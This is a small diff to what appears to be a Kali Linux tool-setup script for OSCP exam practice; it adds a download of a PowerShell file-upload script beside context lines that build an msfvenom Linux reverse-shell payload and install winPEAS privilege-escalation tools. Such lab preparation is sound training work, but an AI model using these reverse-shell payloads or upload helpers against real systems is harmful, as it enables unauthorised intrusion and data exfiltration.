@@ -100,6 +100,8 @@ msfvenom --payload linux/x86/shell_reverse_tcp --platform linux --arch x86 LHOST
 
 # Privesc
 cd /home/kali/oscp/server/privesc
+# Script for uploading files to python's uploadserver from PowerShell
+wget https://raw.githubusercontent.com/juliourena/plaintext/refs/heads/master/Powershell/PSUpload.ps1 -O PSUpload.ps1 --quiet
 # PEAS
 sudo apt install peass --assume-yes --quiet
 cp /usr/share/peass/winpeas/winPEASx64.exe /home/kali/oscp/server/privesc/winpeas.exe
